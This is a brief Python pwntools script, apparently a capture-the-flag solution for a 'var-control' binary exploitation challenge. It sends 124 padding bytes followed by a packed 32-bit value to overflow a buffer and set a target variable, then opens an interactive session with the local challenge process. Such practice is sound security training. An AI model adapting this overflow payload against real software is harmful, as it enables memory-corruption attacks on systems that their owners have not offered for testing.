from pwn import *

win_var = 0X11C966E1

payload = 124 * b'0' + p32(win_var)


r = process('/challenge/binary-exploitation-var-control-w')
r.send(payload)
r.interactive()